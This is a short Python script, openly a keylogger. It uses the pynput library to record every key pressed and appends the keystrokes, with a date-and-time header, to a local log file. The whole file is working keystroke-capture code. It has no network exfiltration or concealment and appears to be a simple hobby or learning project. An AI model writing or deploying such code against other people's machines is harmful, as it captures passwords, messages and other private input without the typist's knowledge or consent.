from pynput import keyboard
import datetime

#Formatting the date and time to show make it visibly appealing
t1 = datetime.datetime.now()
t1=str(t1.strftime("%x"))
t2 = datetime.datetime.now()
t2=str(t2.strftime("%X"))

#Formatted date and time
now=str(t2 +" " +t1)

#Opens the text file and logs the date and time with line skips
with open("Keylogger/logs/log.txt", 'a') as header:
    header.write("\n"+"\n"+now+"\n"+"\n")
header.close()
#From here on, this is the code to open the log and log the pressed buttons 
#into the text
def keyPressed(key):
    with open("Keylogger/logs/log.txt", 'a') as logKey:
        try:
            logKey.write( key.char)
        except:
            if str(key) == "Key.space":
                logKey.write(" ")
            elif str(key) == "Key.enter":
                logKey.write("\n")
            elif str(key) == "Key.backspace":
                logKey.write("[bs]")
            elif str(key) == "Key.tab":
                logKey.write("\t")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
